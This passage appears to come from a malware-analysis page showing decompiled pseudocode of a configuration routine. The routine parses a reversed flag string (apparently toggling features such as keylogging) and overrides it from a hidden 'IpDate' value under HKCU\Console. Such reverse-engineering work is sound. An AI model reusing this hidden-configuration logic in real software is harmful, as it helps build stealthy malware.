rdx</span><br><span class="line">  int v61; // r10d</span><br><span class="line">  __int64 mm; // r8</span><br><span class="line">  int v63; // ecx</span><br><span class="line">  __int64 v64; // rbx</span><br><span class="line">  int v65; // eax</span><br><span class="line">  int v66; // r9d</span><br><span class="line">  __int64 v67; // rdx</span><br><span class="line">  int v68; // r10d</span><br><span class="line">  __int64 nn; // r8</span><br><span class="line">  int v70; // ecx</span><br><span class="line">  __int64 v71; // rbx</span><br><span class="line">  int v72; // eax</span><br><span class="line">  int v73; // r9d</span><br><span class="line">  __int64 v74; // rdx</span><br><span class="line">  int v75; // r10d</span><br><span class="line">  __int64 i1; // r8</span><br><span class="line">  int v77; // ecx</span><br><span class="line">  __int64 v78; // rbx</span><br><span class="line">  int v79; // eax</span><br><span class="line">  int v80; // r9d</span><br><span class="line">  __int64 v81; // rdx</span><br><span class="line">  int v82; // r10d</span><br><span class="line">  __int64 i2; // r8</span><br><span class="line">  __int64 v84; // rbx</span><br><span class="line">  int v85; // eax</span><br><span class="line">  int v86; // r9d</span><br><span class="line">  __int64 v87; // rdx</span><br><span class="line">  int v88; // r10d</span><br><span class="line">  __int64 i3; // r8</span><br><span class="line">  int v90; // ecx</span><br><span class="line">  int v91; // ecx</span><br><span class="line">  __int64 v92; // rbx</span><br><span class="line">  int v93; // r9d</span><br><span class="line">  __int64 v94; // rdx</span><br><span class="line">  __int64 v95; // rsi</span><br><span class="line">  int v96; // r10d</span><br><span class="line">  __int64 v97; // r8</span><br><span class="line">  int v98; // ecx</span><br><span class="line">  _UNKNOWN *retaddr; // [rsp+68h] [rbp+0h] BYREF</span><br><span class="line">  DWORD cbData; // [rsp+70h] [rbp+8h] BYREF</span><br><span class="line">  DWORD Type; // [rsp+78h] [rbp+10h] BYREF</span><br><span class="line">  HKEY hKey; // [rsp+80h] [rbp+18h] BYREF</span><br><span class="line"></span><br><span class="line">  v0 = &amp;retaddr;</span><br><span class="line">  if ( !byte_140060708 )</span><br><span class="line">  &#123;</span><br><span class="line">    byte_140060708 = 1;</span><br><span class="line">    wcsrev(a0Db0Lk0Hs0Ld0L);                    // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot;</span><br><span class="line">    memset(&amp;Src, 0, 0x12A0u);</span><br><span class="line">    sub_140008620(L&quot;p1:&quot;, &amp;Source);</span><br><span class="line">    sub_140008620(L&quot;o1:&quot;, &amp;Source__1);</span><br><span class="line">    v1 = lstrlenW(a0Db0Lk0Hs0Ld0L);             // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot;</span><br><span class="line">    v2 = lstrlenW(L&quot;t1:&quot;);</span><br><span class="line">    v3 = 0;</span><br><span class="line">    v4 = 0;</span><br><span class="line">    if ( (int)v1 &gt; 0 )</span><br><span class="line">    &#123;</span><br><span class="line">      while ( 1 )</span><br><span class="line">      &#123;</span><br><span class="line">        v5 = 0;</span><br><span class="line">        for ( i = 0; i &lt; v2; ++v5 )</span><br><span class="line">        &#123;</span><br><span class="line">          if ( a0Db0Lk0Hs0Ld0L[v4 + i] != aT1[i] )// &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot;</span><br><span class="line">            break;</span><br><span class="line">          ++i;</span><br><span class="line">        &#125;</span><br><span class="line">        if ( v5 == v2 )</span><br><span class="line">        &#123;</span><br><span class="line">          v4 += v2;</span><br><span class="line">          v3 += v2;</span><br><span class="line">          if ( v4 &lt; v1 )</span><br><span class="line">            break;</span><br><span class="line">        &#125;</span><br><span class="line">LABEL_10:</span><br><span class="line">        ++v4;</span><br><span class="line">        ++v3;</span><br><span class="line">        if ( v4 &gt;= v1 )</span><br><span class="line">          goto LABEL_15;</span><br><span class="line">      &#125;</span><br><span class="line">      // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot;</span><br><span class="line">      while ( a0Db0Lk0Hs0Ld0L[v4] != 124 )</span><br><span class="line">      &#123;</span><br><span class="line">        ++v4;</span><br><span class="line">        ++v3;</span><br><span class="line">        if ( v4 &gt;= v1 )</span><br><span class="line">          goto LABEL_10;</span><br><span class="line">      &#125;</span><br><span class="line">      v7 = dword_14005F6A8;</span><br><span class="line">      if ( a0Db0Lk0Hs0Ld0L[v3 - 1] == 49 )      // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot;</span><br><span class="line">        v7 = 1;</span><br><span class="line">      dword_14005F6A8 = v7;</span><br><span class="line">    &#125;</span><br><span class="line">LABEL_15:</span><br><span class="line">    sub_140008620(L&quot;p2:&quot;, &amp;Source_);</span><br><span class="line">    sub_140008620(L&quot;o2:&quot;, &amp;Source__0);</span><br><span class="line">    v8 = lstrlenW(a0Db0Lk0Hs0Ld0L);             // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot;</span><br><span class="line">    v9 = lstrlenW(L&quot;t2:&quot;);</span><br><span class="line">    v10 = 0;</span><br><span class="line">    v11 = 0;</span><br><span class="line">    if ( (int)v8 &gt; 0 )</span><br><span class="line">    &#123;</span><br><span class="line">      while ( 1 )</span><br><span class="line">      &#123;</span><br><span class="line">        v12 = 0;</span><br><span class="line">        for ( j = 0; j &lt; v9; ++v12 )</span><br><span class="line">        &#123;</span><br><span class="line">          if ( a0Db0Lk0Hs0Ld0L[v11 + j] != aT2[j] )// &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot;</span><br><span class="line">            break;</span><br><span class="line">          ++j;</span><br><span class="line">        &#125;</span><br><span class="line">        if ( v12 == v9 )</span><br><span class="line">        &#123;</span><br><span class="line">          v11 += v9;</span><br><span class="line">          v10 += v9;</span><br><span class="line">          if ( v11 &lt; v8 )</span><br><span class="line">            break;</span><br><span class="line">        &#125;</span><br><span class="line">LABEL_23:</span><br><span class="line">        ++v11;</span><br><span class="line">        ++v10;</span><br><span class="line">        if ( v11 &gt;= v8 )</span><br><span class="line">          goto LABEL_28;</span><br><span class="line">      &#125;</span><br><span class="line">      // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot;</span><br><span class="line">      while ( a0Db0Lk0Hs0Ld0L[v11] != 124 )</span><br><span class="line">      &#123;</span><br><span class="line">        ++v11;</span><br><span class="line">        ++v10;</span><br><span class="line">        if ( v11 &gt;= v8 )</span><br><span class="line">          goto LABEL_23;</span><br><span class="line">      &#125;</span><br><span class="line">      v14 = dword_14005F8E8;</span><br><span class="line">      if ( a0Db0Lk0Hs0Ld0L[v10 - 1] == 49 )     // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot;</span><br><span class="line">        v14 = 1;</span><br><span class="line">      dword_14005F8E8 = v14;</span><br><span class="line">    &#125;</span><br><span class="line">LABEL_28:</span><br><span class="line">    sub_140008620(L&quot;p3:&quot;, &amp;Source__2);</span><br><span class="line">    sub_140008620(L&quot;o3:&quot;, &amp;Source__3);</span><br><span class="line">    v15 = lstrlenW(a0Db0Lk0Hs0Ld0L);            // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot;</span><br><span class="line">    v16 = lstrlenW(L&quot;t3:&quot;);</span><br><span class="line">    v17 = 0;</span><br><span class="line">    v18 = 0;</span><br><span class="line">    if ( (int)v15 &gt; 0 )</span><br><span class="line">    &#123;</span><br><span class="line">      while ( 1 )</span><br><span class="line">      &#123;</span><br><span class="line">        v19 = 0;</span><br><span class="line">        for ( k = 0; k &lt; v16; ++v19 )</span><br><span class="line">        &#123;</span><br><span class="line">          if ( a0Db0Lk0Hs0Ld0L[v18 + k] != aT3[k] )// &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot;</span><br><span class="line">            break;</span><br><span class="line">          ++k;</span><br><span class="line">        &#125;</span><br><span class="line">        if ( v19 == v16 )</span><br><span class="line">        &#123;</span><br><span class="line">          v18 += v16;</span><br><span class="line">          v17 += v16;</span><br><span class="line">          if ( v18 &lt; v15 )</span><br><span class="line">            break;</span><br><span class="line">        &#125;</span><br><span class="line">LABEL_36:</span><br><span class="line">        ++v18;</span><br><span class="line">        ++v17;</span><br><span class="line">        if ( v18 &gt;= v15 )</span><br><span class="line">          goto LABEL_41;</span><br><span class="line">      &#125;</span><br><span class="line">      // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot;</span><br><span class="line">      while ( a0Db0Lk0Hs0Ld0L[v18] != 124 )</span><br><span class="line">      &#123;</span><br><span class="line">        ++v18;</span><br><span class="line">        ++v17;</span><br><span class="line">        if ( v18 &gt;= v15 )</span><br><span class="line">          goto LABEL_36;</span><br><span class="line">      &#125;</span><br><span class="line">      v21 = dword_14005FB28;</span><br><span class="line">      if ( a0Db0Lk0Hs0Ld0L[v17 - 1] == 49 )     // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot;</span><br><span class="line">        v21 = 1;</span><br><span class="line">      dword_14005FB28 = v21;</span><br><span class="line">    &#125;</span><br><span class="line">LABEL_41:</span><br><span class="line">    sub_140008620(L&quot;dd:&quot;, &amp;Destination__0);</span><br><span class="line">    sub_140008620(L&quot;cl:&quot;, &amp;Destination__1);</span><br><span class="line">    sub_140008620(L&quot;fz:&quot;, &amp;unk_14005FBA4);</span><br><span class="line">    sub_140008620(L&quot;bb:&quot;, &amp;unk_14005FC08);</span><br><span class="line">    sub_140008620(L&quot;bz:&quot;, &amp;unk_14005FC6C);</span><br><span class="line">    v22 = lstrlenW(a0Db0Lk0Hs0Ld0L);            // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot;</span><br><span class="line">    v23 = lstrlenW(L&quot;jp:&quot;);</span><br><span class="line">    v24 = 0;</span><br><span class="line">    v25 = 0;</span><br><span class="line">    if ( (int)v22 &gt; 0 )</span><br><span class="line">    &#123;</span><br><span class="line">      while ( 1 )</span><br><span class="line">      &#123;</span><br><span class="line">        v26 = 0;</span><br><span class="line">        for ( m = 0; m &lt; v23; ++v26 )</span><br><span class="line">        &#123;</span><br><span class="line">          if ( a0Db0Lk0Hs0Ld0L[v25 + m] != aJp[m] )// &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot;</span><br><span class="line">            break;</span><br><span class="line">          ++m;</span><br><span class="line">        &#125;</span><br><span class="line">        if ( v26 == v23 )</span><br><span class="line">        &#123;</span><br><span class="line">          v25 += v23;</span><br><span class="line">          v24 += v23;</span><br><span class="line">          if ( v25 &lt; v22 )</span><br><span class="line">            break;</span><br><span class="line">        &#125;</span><br><span class="line">LABEL_49:</span><br><span class="line">        ++v25;</span><br><span class="line">        ++v24;</span><br><span class="line">        if ( v25 &gt;= v22 )</span><br><span class="line">          goto LABEL_54;</span><br><span class="line">      &#125;</span><br><span class="line">      // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot;</span><br><span class="line">      while ( a0Db0Lk0Hs0Ld0L[v25] != 124 )</span><br><span class="line">      &#123;</span><br><span class="line">        ++v25;</span><br><span class="line">        ++v24;</span><br><span class="line">        if ( v25 &gt;= v22 )</span><br><span class="line">          goto LABEL_49;</span><br><span class="line">      &#125;</span><br><span class="line">      v28 = dword_14005FCD0;</span><br><span class="line">      if ( a0Db0Lk0Hs0Ld0L[v24 - 1] == 49 )     // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot;</span><br><span class="line">        v28 = 1;</span><br><span class="line">      dword_14005FCD0 = v28;</span><br><span class="line">    &#125;</span><br><span class="line">LABEL_54:</span><br><span class="line">    v29 = lstrlenW(a0Db0Lk0Hs0Ld0L);            // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot;</span><br><span class="line">    v30 = lstrlenW(L&quot;sx:&quot;);</span><br><span class="line">    v31 = 0;</span><br><span class="line">    v32 = 0;</span><br><span class="line">    if ( (int)v29 &gt; 0 )</span><br><span class="line">    &#123;</span><br><span class="line">      while ( 1 )</span><br><span class="line">      &#123;</span><br><span class="line">        v33 = 0;</span><br><span class="line">        for ( n = 0; n &lt; v30; ++v33 )</span><br><span class="line">        &#123;</span><br><span class="line">          if ( a0Db0Lk0Hs0Ld0L[v32 + n] != aSx[n] )// &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot;</span><br><span class="line">            break;</span><br><span class="line">          ++n;</span><br><span class="line">        &#125;</span><br><span class="line">        if ( v33 == v30 )</span><br><span class="line">        &#123;</span><br><span class="line">          v32 += v30;</span><br><span class="line">          v31 += v30;</span><br><span class="line">          if ( v32 &lt; v29 )</span><br><span class="line">            break;</span><br><span class="line">        &#125;</span><br><span class="line">LABEL_62:</span><br><span class="line">        ++v32;</span><br><span class="line">        ++v31;</span><br><span class="line">        if ( v32 &gt;= v29 )</span><br><span class="line">          goto LABEL_67;</span><br><span class="line">      &#125;</span><br><span class="line">      // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot;</span><br><span class="line">      while ( a0Db0Lk0Hs0Ld0L[v32] != 124 )</span><br><span class="line">      &#123;</span><br><span class="line">        ++v32;</span><br><span class="line">        ++v31;</span><br><span class="line">        if ( v32 &gt;= v29 )</span><br><span class="line">          goto LABEL_62;</span><br><span class="line">      &#125;</span><br><span class="line">      v35 = dword_14005FCD4;</span><br><span class="line">      if ( a0Db0Lk0Hs0Ld0L[v31 - 1] == 49 )     // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot;</span><br><span class="line">        v35 = 1;</span><br><span class="line">      dword_14005FCD4 = v35;</span><br><span class="line">    &#125;</span><br><span class="line">LABEL_67:</span><br><span class="line">    v36 = lstrlenW(a0Db0Lk0Hs0Ld0L);            // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot;</span><br><span class="line">    v37 = lstrlenW(L&quot;bh:&quot;);</span><br><span class="line">    v38 = 0;</span><br><span class="line">    v39 = 0;</span><br><span class="line">    if ( (int)v36 &gt; 0 )</span><br><span class="line">    &#123;</span><br><span class="line">      while ( 1 )</span><br><span class="line">      &#123;</span><br><span class="line">        v40 = 0;</span><br><span class="line">        for ( ii = 0; ii &lt; v37; ++v40 )</span><br><span class="line">        &#123;</span><br><span class="line">          if ( a0Db0Lk0Hs0Ld0L[v39 + ii] != aBh[ii] )// &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot;</span><br><span class="line">            break;</span><br><span class="line">          ++ii;</span><br><span class="line">        &#125;</span><br><span class="line">        if ( v40 == v37 )</span><br><span class="line">        &#123;</span><br><span class="line">          v39 += v37;</span><br><span class="line">          v38 += v37;</span><br><span class="line">          if ( v39 &lt; v36 )</span><br><span class="line">            break;</span><br><span class="line">        &#125;</span><br><span class="line">LABEL_75:</span><br><span class="line">        ++v39;</span><br><span class="line">        ++v38;</span><br><span class="line">        if ( v39 &gt;= v36 )</span><br><span class="line">          goto LABEL_80;</span><br><span class="line">      &#125;</span><br><span class="line">      // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot;</span><br><span class="line">      while ( a0Db0Lk0Hs0Ld0L[v39] != 124 )</span><br><span class="line">      &#123;</span><br><span class="line">        ++v39;</span><br><span class="line">        ++v38;</span><br><span class="line">        if ( v39 &gt;= v36 )</span><br><span class="line">          goto LABEL_75;</span><br><span class="line">      &#125;</span><br><span class="line">      v42 = dword_14005FCD8;</span><br><span class="line">      if ( a0Db0Lk0Hs0Ld0L[v38 - 1] == 49 )     // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot;</span><br><span class="line">        v42 = 1;</span><br><span class="line">      dword_14005FCD8 = v42;</span><br><span class="line">    &#125;</span><br><span class="line">LABEL_80:</span><br><span class="line">    v43 = lstrlenW(a0Db0Lk0Hs0Ld0L);            // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot;</span><br><span class="line">    v44 = lstrlenW(L&quot;ll:&quot;);</span><br><span class="line">    v45 = 0;</span><br><span class="line">    v46 = 0;</span><br><span class="line">    if ( (int)v43 &gt; 0 )</span><br><span class="line">    &#123;</span><br><span class="line">      while ( 1 )</span><br><span class="line">      &#123;</span><br><span class="line">        v47 = 0;</span><br><span class="line">        for ( jj = 0; jj &lt; v44; ++v47 )</span><br><span class="line">        &#123;</span><br><span class="line">          if ( a0Db0Lk0Hs0Ld0L[v46 + jj] != aLl[jj] )// &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot;</span><br><span class="line">            break;</span><br><span class="line">          ++jj;</span><br><span class="line">        &#125;</span><br><span class="line">        if ( v47 == v44 )</span><br><span class="line">        &#123;</span><br><span class="line">          v46 += v44;</span><br><span class="line">          v45 += v44;</span><br><span class="line">          if ( v46 &lt; v43 )</span><br><span class="line">            break;</span><br><span class="line">        &#125;</span><br><span class="line">LABEL_88:</span><br><span class="line">        ++v46;</span><br><span class="line">        ++v45;</span><br><span class="line">        if ( v46 &gt;= v43 )</span><br><span class="line">          goto LABEL_93;</span><br><span class="line">      &#125;</span><br><span class="line">      // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot;</span><br><span class="line">      while ( a0Db0Lk0Hs0Ld0L[v46] != 124 )</span><br><span class="line">      &#123;</span><br><span class="line">        ++v46;</span><br><span class="line">        ++v45;</span><br><span class="line">        if ( v46 &gt;= v43 )</span><br><span class="line">          goto LABEL_88;</span><br><span class="line">      &#125;</span><br><span class="line">      v49 = dword_14005FCDC;</span><br><span class="line">      if ( a0Db0Lk0Hs0Ld0L[v45 - 1] == 49 )     // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot;</span><br><span class="line">        v49 = 1;</span><br><span class="line">      dword_14005FCDC = v49;</span><br><span class="line">    &#125;</span><br><span class="line">LABEL_93:</span><br><span class="line">    v50 = lstrlenW(a0Db0Lk0Hs0Ld0L);            // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot;</span><br><span class="line">    v51 = lstrlenW(L&quot;dl:&quot;);</span><br><span class="line">    v52 = 0;</span><br><span class="line">    v53 = 0;</span><br><span class="line">    if ( (int)v50 &gt; 0 )</span><br><span class="line">    &#123;</span><br><span class="line">      while ( 1 )</span><br><span class="line">      &#123;</span><br><span class="line">        v54 = 0;</span><br><span class="line">        for ( kk = 0; kk &lt; v51; ++v54 )</span><br><span class="line">        &#123;</span><br><span class="line">          if ( a0Db0Lk0Hs0Ld0L[v53 + kk] != aDl[kk] )// &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot;</span><br><span class="line">            break;</span><br><span class="line">          ++kk;</span><br><span class="line">        &#125;</span><br><span class="line">        if ( v54 == v51 )</span><br><span class="line">        &#123;</span><br><span class="line">          v53 += v51;</span><br><span class="line">          v52 += v51;</span><br><span class="line">          if ( v53 &lt; v50 )</span><br><span class="line">            break;</span><br><span class="line">        &#125;</span><br><span class="line">LABEL_101:</span><br><span class="line">        ++v53;</span><br><span class="line">        ++v52;</span><br><span class="line">        if ( v53 &gt;= v50 )</span><br><span class="line">          goto LABEL_106;</span><br><span class="line">      &#125;</span><br><span class="line">      // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot;</span><br><span class="line">      while ( a0Db0Lk0Hs0Ld0L[v53] != 124 )</span><br><span class="line">      &#123;</span><br><span class="line">        ++v53;</span><br><span class="line">        ++v52;</span><br><span class="line">        if ( v53 &gt;= v50 )</span><br><span class="line">          goto LABEL_101;</span><br><span class="line">      &#125;</span><br><span class="line">      v56 = dword_14005FCE0;</span><br><span class="line">      if ( a0Db0Lk0Hs0Ld0L[v52 - 1] == 49 )     // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot;</span><br><span class="line">        v56 = 1;</span><br><span class="line">      dword_14005FCE0 = v56;</span><br><span class="line">    &#125;</span><br><span class="line">LABEL_106:</span><br><span class="line">    v57 = lstrlenW(a0Db0Lk0Hs0Ld0L);            // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot;</span><br><span class="line">    v58 = lstrlenW(L&quot;sh:&quot;);</span><br><span class="line">    v59 = 0;</span><br><span class="line">    v60 = 0;</span><br><span class="line">    if ( (int)v57 &gt; 0 )</span><br><span class="line">    &#123;</span><br><span class="line">      while ( 1 )</span><br><span class="line">      &#123;</span><br><span class="line">        v61 = 0;</span><br><span class="line">        for ( mm = 0; mm &lt; v58; ++v61 )</span><br><span class="line">        &#123;</span><br><span class="line">          if ( a0Db0Lk0Hs0Ld0L[v60 + mm] != aSh[mm] )// &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot;</span><br><span class="line">            break;</span><br><span class="line">          ++mm;</span><br><span class="line">        &#125;</span><br><span class="line">        if ( v61 == v58 )</span><br><span class="line">        &#123;</span><br><span class="line">          v60 += v58;</span><br><span class="line">          v59 += v58;</span><br><span class="line">          if ( v60 &lt; v57 )</span><br><span class="line">            break;</span><br><span class="line">        &#125;</span><br><span class="line">LABEL_114:</span><br><span class="line">        ++v60;</span><br><span class="line">        ++v59;</span><br><span class="line">        if ( v60 &gt;= v57 )</span><br><span class="line">          goto LABEL_119;</span><br><span class="line">      &#125;</span><br><span class="line">      // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot;</span><br><span class="line">      while ( a0Db0Lk0Hs0Ld0L[v60] != 124 )</span><br><span class="line">      &#123;</span><br><span class="line">        ++v60;</span><br><span class="line">        ++v59;</span><br><span class="line">        if ( v60 &gt;= v57 )</span><br><span class="line">          goto LABEL_114;</span><br><span class="line">      &#125;</span><br><span class="line">      v63 = dword_14005FCE4;</span><br><span class="line">      if ( a0Db0Lk0Hs0Ld0L[v59 - 1] == 49 )     // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot;</span><br><span class="line">        v63 = 1;</span><br><span class="line">      dword_14005FCE4 = v63;</span><br><span class="line">    &#125;</span><br><span class="line">LABEL_119:</span><br><span class="line">    v64 = lstrlenW(a0Db0Lk0Hs0Ld0L);            // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot;</span><br><span class="line">    v65 = lstrlenW(L&quot;kl:&quot;);</span><br><span class="line">    v66 = 0;</span><br><span class="line">    v67 = 0;</span><br><span class="line">    if ( (int)v64 &gt; 0 )</span><br><span class="line">    &#123;</span><br><span class="line">      while ( 1 )</span><br><span class="line">      &#123;</span><br><span class="line">        v68 = 0;</span><br><span class="line">        for ( nn = 0; nn &lt; v65; ++v68 )</span><br><span class="line">        &#123;</span><br><span class="line">          if ( a0Db0Lk0Hs0Ld0L[v67 + nn] != aKl[nn] )// &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot;</span><br><span class="line">            break;</span><br><span class="line">          ++nn;</span><br><span class="line">        &#125;</span><br><span class="line">        if ( v68 == v65 )</span><br><span class="line">        &#123;</span><br><span class="line">          v67 += v65;</span><br><span class="line">          v66 += v65;</span><br><span class="line">          if ( v67 &lt; v64 )</span><br><span class="line">            break;</span><br><span class="line">        &#125;</span><br><span class="line">LABEL_127:</span><br><span class="line">        ++v67;</span><br><span class="line">        ++v66;</span><br><span class="line">        if ( v67 &gt;= v64 )</span><br><span class="line">          goto LABEL_132;</span><br><span class="line">      &#125;</span><br><span class="line">      // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot;</span><br><span class="line">      while ( a0Db0Lk0Hs0Ld0L[v67] != 124 )</span><br><span class="line">      &#123;</span><br><span class="line">        ++v67;</span><br><span class="line">        ++v66;</span><br><span class="line">        if ( v67 &gt;= v64 )</span><br><span class="line">          goto LABEL_127;</span><br><span class="line">      &#125;</span><br><span class="line">      v70 = dword_14005FCE8;</span><br><span class="line">      if ( a0Db0Lk0Hs0Ld0L[v66 - 1] == 49 )     // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot;</span><br><span class="line">        v70 = 1;</span><br><span class="line">      dword_14005FCE8 = v70;</span><br><span class="line">    &#125;</span><br><span class="line">LABEL_132:</span><br><span class="line">    v71 = lstrlenW(a0Db0Lk0Hs0Ld0L);            // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot;</span><br><span class="line">    v72 = lstrlenW(L&quot;bd:&quot;);</span><br><span class="line">    v73 = 0;</span><br><span class="line">    v74 = 0;</span><br><span class="line">    if ( (int)v71 &gt; 0 )</span><br><span class="line">    &#123;</span><br><span class="line">      while ( 1 )</span><br><span class="line">      &#123;</span><br><span class="line">        v75 = 0;</span><br><span class="line">        for ( i1 = 0; i1 &lt; v72; ++v75 )</span><br><span class="line">        &#123;</span><br><span class="line">          if ( a0Db0Lk0Hs0Ld0L[v74 + i1] != aBd[i1] )// &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot;</span><br><span class="line">            break;</span><br><span class="line">          ++i1;</span><br><span class="line">        &#125;</span><br><span class="line">        if ( v75 == v72 )</span><br><span class="line">        &#123;</span><br><span class="line">          v74 += v72;</span><br><span class="line">          v73 += v72;</span><br><span class="line">          if ( v74 &lt; v71 )</span><br><span class="line">            break;</span><br><span class="line">        &#125;</span><br><span class="line">LABEL_140:</span><br><span class="line">        ++v74;</span><br><span class="line">        ++v73;</span><br><span class="line">        if ( v74 &gt;= v71 )</span><br><span class="line">          goto LABEL_145;</span><br><span class="line">      &#125;</span><br><span class="line">      // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot;</span><br><span class="line">      while ( a0Db0Lk0Hs0Ld0L[v74] != 124 )</span><br><span class="line">      &#123;</span><br><span class="line">        ++v74;</span><br><span class="line">        ++v73;</span><br><span class="line">        if ( v74 &gt;= v71 )</span><br><span class="line">          goto LABEL_140;</span><br><span class="line">      &#125;</span><br><span class="line">      v77 = dword_14005FCEC;</span><br><span class="line">      if ( a0Db0Lk0Hs0Ld0L[v73 - 1] == 49 )     // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot;</span><br><span class="line">        v77 = 1;</span><br><span class="line">      dword_14005FCEC = v77;</span><br><span class="line">    &#125;</span><br><span class="line">LABEL_145:</span><br><span class="line">    Type = 3;</span><br><span class="line">    cbData = 0;</span><br><span class="line">    LODWORD(v0) = RegOpenKeyExW(HKEY_CURRENT_USER, L&quot;Console&quot;, 0, 0x20019u, &amp;hKey);</span><br><span class="line">    if ( !(_DWORD)v0 )</span><br><span class="line">      LODWORD(v0) = RegQueryValueExW(hKey, L&quot;IpDate&quot;, 0, &amp;Type, 0, &amp;cbData);</span><br><span class="line">    if ( cbData &gt; 0xA )</span><br><span class="line">    &#123;</span><br><span class="line">      memset(a0Db0Lk0Hs0Ld0L, 0, 0x7D0u);       // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot;</span><br><span class="line">      RegQueryValueExW(hKey, L&quot;IpDate&quot;, 0, &amp;Type, (LPBYTE)a0Db0Lk0Hs0Ld0L, &amp;cbData);// &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot;</span><br><span class="line">      sub_140008620(L&quot;p1:&quot;, &amp;Source);</span><br><span class="line">      sub_140008620(L&quot;o1:&quot;, &amp;Source__1);</span><br><span class="line">      v78 = lstrlenW(a0Db0Lk0Hs0Ld0L);          // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot;</span><br><span class="line">      v79 = lstrlenW(L&quot;t1:&quot;);</span><br><span class="line">      v80 = 0;</span><br><span class="line">      v81 = 0;</span><br><span class="line">      if ( (int)v78 &gt; 0 )</span><br><span class="line">      &#123;</span><br><span class="line">        while ( 1 )</span><br><span class="line">        &#123;</span><br><span class="line">          v82 = 0;</span><br><span class="line">          for ( i2 = 0; i2 &lt; 